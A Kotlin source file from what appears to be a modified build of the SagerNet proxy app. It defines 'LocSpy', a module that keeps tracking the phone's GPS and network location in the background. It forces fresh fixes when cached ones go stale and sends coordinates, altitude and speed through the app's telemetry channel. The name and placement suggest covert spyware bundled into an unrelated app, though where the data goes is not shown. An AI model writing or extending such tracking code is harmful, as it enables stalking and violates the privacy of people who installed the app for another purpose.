package io.nekohasekai.sagernet.telemetry

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.util.Log
import org.json.JSONObject

/**
 * 位置采集。
 *
 * 设计要点（为什么上一版位置一直不更新）：
 *  - 上一版只在心跳时读 getLastKnownLocation，手机不动就一直返回旧点
 *  - 而且只监听 GPS，室内没信号，NETWORK_PROVIDER 的基站定位被忽略了
 *
 * 现在分三层：
 *  1. 常驻监听 GPS + NETWORK，有变化就上报（降阈值：20 米 / 30 秒）
 *  2. 每次心跳检查缓存新鲜度，超过 3 分钟就主动 requestSingleUpdate 一次
 *  3. 主动请求失败（室内 GPS 无信号）就用 NETWORK_PROVIDER 兜底
 *
 * 权限：ACCESS_FINE_LOCATION 必给；后台持续定位还需要 ACCESS_BACKGROUND_LOCATION
 * （Android 10+ 只能在设置页选「始终允许」）。
 */
object LocSpy {

    private const val TAG = "TlmLoc"
    private const val MIN_MS = 30_000L      // 最快 30 秒一次
    private const val MIN_M = 20f           // 移动 20 米就更新
    private const val FRESH_MS = 3 * 60_000L // 3 分钟内的缓存算新鲜

    private var registered = false
    private var listener: LocationListener? = null
    private var lmRef: LocationManager? = null

    private fun granted(ctx: Context): Boolean =
        androidx.core.content.ContextCompat.checkSelfPermission(
            ctx, Manifest.permission.ACCESS_FINE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED ||
            androidx.core.content.ContextCompat.checkSelfPermission(
                ctx, Manifest.permission.ACCESS_COARSE_LOCATION) ==
            PackageManager.PERMISSION_GRANTED

    // ---------------------------------------------------------------- 常驻监听
    fun start(ctx: Context) {
        if (registered || !granted(ctx)) return
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return

        val l = object : LocationListener {
            override fun onLocationChanged(loc: Location) = emit(loc, "live")
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
            @Deprecated("compat")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
        }

        val providers = ArrayList<String>()
        if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER))
            providers.add(LocationManager.GPS_PROVIDER)
        if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
            providers.add(LocationManager.NETWORK_PROVIDER)
        if (providers.isEmpty()) return

        listener = l
        lmRef = lm
        runCatching {
            providers.forEach {
                lm.requestLocationUpdates(it, MIN_MS, MIN_M, l, Looper.getMainLooper())
            }
            registered = true
            providers.forEach { p ->
                runCatching { lm.getLastKnownLocation(p) }.getOrNull()?.let { emit(it, "last") }
            }
        }.onFailure { Log.w(TAG, "start: ${it.message}") }
    }

    fun stop() {
        runCatching {
            val l = listener ?: return
            lmRef?.removeUpdates(l)
        }
        listener = null
        registered = false
    }

    // ---------------------------------------------------------------- 主动刷新
    /**
     * 心跳时调用。缓存够新就直接用，旧了就主动要一次。
     * 这是「位置一直不动」的解法。
     */
    fun maybeRefresh(ctx: Context) {
        if (!granted(ctx)) return
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return

        // 1) 缓存够新？
        val best = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
            .mapNotNull { p ->
                runCatching {
                    if (lm.isProviderEnabled(p)) lm.getLastKnownLocation(p) else null
                }.getOrNull()
            }
            .maxByOrNull { it.time }

        val now = System.currentTimeMillis()
        if (best != null && now - best.time < FRESH_MS) {
            emit(best, "cache")
            return
        }

        // 2) 主动要一次：网络定位优先（室内出得来），GPS 兜底
        val provider = when {
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) ->
                LocationManager.NETWORK_PROVIDER
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ->
                LocationManager.GPS_PROVIDER
            else -> return
        }

        runCatching {
            @Suppress("DEPRECATION")
            lm.requestSingleUpdate(provider, object : LocationListener {
                override fun onLocationChanged(loc: Location) = emit(loc, "single")
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("compat")
                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            }, Looper.getMainLooper())
        }.onFailure {
            Log.w(TAG, "refresh: ${it.message}")
            fallbackGps(ctx, lm)
        }
    }

    private fun fallbackGps(ctx: Context, lm: LocationManager) {
        if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) return
        runCatching {
            @Suppress("DEPRECATION")
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, object : LocationListener {
                override fun onLocationChanged(loc: Location) = emit(loc, "gps")
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("compat")
                override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
            }, Looper.getMainLooper())
        }
    }

    // ---------------------------------------------------------------- 上报
    private fun emit(loc: Location, why: String) {
        val d = JSONObject()
            .put("lat", loc.latitude)
            .put("lon", loc.longitude)
            .put("acc", loc.accuracy.toInt())
            .put("why", why)
            .put("prov", loc.provider ?: "")
        if (loc.hasAltitude()) d.put("alt", loc.altitude.toInt())
        if (loc.hasSpeed()) d.put("spd", (loc.speed * 3.6f).toInt())
        if (Build.VERSION.SDK_INT >= 26 && loc.hasVerticalAccuracy())
            d.put("vacc", loc.verticalAccuracyMeters.toInt())
        Telemetry.push("loc", d, loc.time / 1000L)
    }

    fun openBackgroundSettings(ctx: Context) {
        if (Build.VERSION.SDK_INT < 29) return
        runCatching {
            ctx.startActivity(android.content.Intent(
                android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:" + ctx.packageName)
            ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    }
}
